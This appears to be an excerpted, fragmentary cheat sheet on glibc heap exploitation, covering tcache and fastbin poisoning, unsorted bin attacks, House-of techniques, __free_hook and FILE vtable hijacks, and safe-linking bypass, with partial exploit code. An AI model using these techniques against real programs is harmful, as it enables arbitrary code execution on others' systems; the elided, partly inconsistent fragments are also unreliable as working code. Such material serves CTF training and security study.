...
Every heap exploitation technique is tightly coupled to the glibc version. Confirm the version first:
...
| 2.29 | unsorted bin unlink hardening (chunk size check) | unsorted bin attack neutered |
...
tcache is a per-thread cache, one singly-linked list per size class (fd only).
Before 2.29 the double-free check only looked at whether the list head was itself, it did not traverse the list.
...
# Allocate chunks beyond the tcache range (>0x408), free into the unsorted bin, main_arena pointer remains
for i in range(8):
    add(i, 0x80)
...
add(9, 0x80)  # carve part back, keep the fd
...
free(10)
free(11)
# Use the UAF to make chunk11's fd point to __free_hook
edit(11, p64(libc.sym['__free_hook']))
add(12, 0x30)  # take chunk11 out
...
```text
Principle: the tcache/fastbin fd is XOR-obfuscated with PROTECT_PTR when written:
...
```text
Key points:
1. fastbin is a singly-linked list (fd only), no size check except that the chunk size must match
2. After 2.27 tcache has priority, fastbin is only used when tcache is full
3. Still need to forge memory that looks like a chunk (size field = real chunk size, ± some)
```
...
# Change the fd to a fake chunk (requires the size bytes at fake_addr + 8 to match 0x70)
...
Since 2.29 the bck->fd == victim check was added and cannot be bypassed
Use: overwrite global_max_fast so small chunks also go to fastbin → combine with a fastbin attack
```
...
free(0)
# Use the UAF to change the bk pointer to target - 0x10
...
Since 2.32 a chunk size check was also added, but it can still be used to change global_max_fast, _IO_list_all, etc.
Advanced technique, commonly used in combination chains like House of Husk
```
...
|------|---------|---------|
| House of Force | 2.28 and earlier | change the top chunk size to a huge value → malloc at an arbitrary address |
| House of Lore | all versions | forge a small bin chain → return an arbitrary address |
| House of Orange | 2.23-2.30 | unsorted attack changes _IO_list_all to trigger _IO_flush_all_lockp |
...
## Real exploitation steps (universal 4 steps)

```text
Step 1: leak heap base
  - Allocate a chunk → free to tcache (2.32+ keeps the obfuscated fd) → show → derive the heap
  - Or: allocate a large chunk → free to unsorted → carve back → show fd

Step 2: leak libc base
  - Free a large chunk to the unsorted bin, fd/bk keep the main_arena address
...
```text
Goal: when the program calls puts/printf, execution eventually reaches _IO_file_xsputn → _IO_OVERFLOW → calls the vtable
Hijack:
  1. Overwrite the vtable pointer of _IO_2_1_stderr_ to point to a forged vtable
...
Hijack: change the func pointer of a list node to system, and arg to "/bin/sh"
Note: 2.34+ added PTR_DEMANGLE, you must leak the guard value at fs:[0x30] in tls to forge it
```

### tls_dtor_list (more modern)

```text
__call_tls_dtors walks it, similar structure, also needs PTR_DEMANGLE bypass
Applies: reached when the program exits, more universal than the FILE attack
```
...
find_fake_fast <addr> <size>  # find a spot usable as a fake-chunk fd write target
...
# === Choose the technique stack later based on the vulnerability type ===
```

## Notes

- **The glibc version is the primary issue** — the same binary with a 2.27 libc vs a 2.34 libc takes a completely different exploitation path
- **tcache capacity = 7** (per size class) — you must spray 7 before spilling into unsorted/fastbin
- **chunk size = user request + 0x10 header, aligned to 0x10** (not counting the 0x10 header, the actually writable area exceeds 0x8 because the next chunk's prev_size is reused)
- **Remote heap spraying is unstable** — in a server fork model each connection may have a different brk/mmap, run randomization tests
- **Do not leave unsorted residue in the attack chain** — a main_arena pointer appearing in an unexpected chunk will corrupt later show output
- **safe-linking error rate** — remember it is `pos >> 12` when computing PROTECT_PTR: pos is the address being written to, not the address being pointed to
